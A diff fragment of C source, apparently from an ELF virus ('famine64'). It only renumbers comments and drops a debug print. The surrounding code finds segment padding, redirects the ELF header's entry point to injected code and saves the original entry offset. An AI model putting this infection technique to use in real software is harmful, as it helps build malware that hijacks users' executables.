@@ -270,15 +270,15 @@ void		pack_dat_elf(char *path, int size, char *data)
 		return ;
 	}
 
-	/* 6. Save values usefull for later */
+	/* 4. Save values usefull for later */
 		/* Where we write our code */
 	Elf64_Addr off = iprogram->p_offset + iprogram->p_filesz;
 		/* old entry point offset */
 	Elf64_Addr old_entry = (off - (((Elf64_Ehdr *)data)->e_entry - iprogram->p_vaddr) + sizeof(famine64_signature)) * (-1);
 
-	/* 7. Change Elf Header entry point */
+	/* 5. Change Elf Header entry point */
 	((Elf64_Ehdr *)data)->e_entry = off + iprogram->p_vaddr + sizeof(famine64_signature); // New entry point
-	/* 8. Check if we have room to write our code */
+	/* 6. Check if we have room to write our code */
 	/* Get the next segment */
 	Elf64_Phdr *next_ptload = NULL;
 	for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_phnum; i++)
@@ -287,7 +287,6 @@ void		pack_dat_elf(char *path, int size, char *data)
 			if (!next_ptload || program[i].p_offset < next_ptload->p_offset)
 				next_ptload = program + i;
 	}
-printf(" famine64_size: %#lx", famine64_size);	
 	if (next_ptload != NULL)
 	{
 		Elf64_Addr	padding = 0;
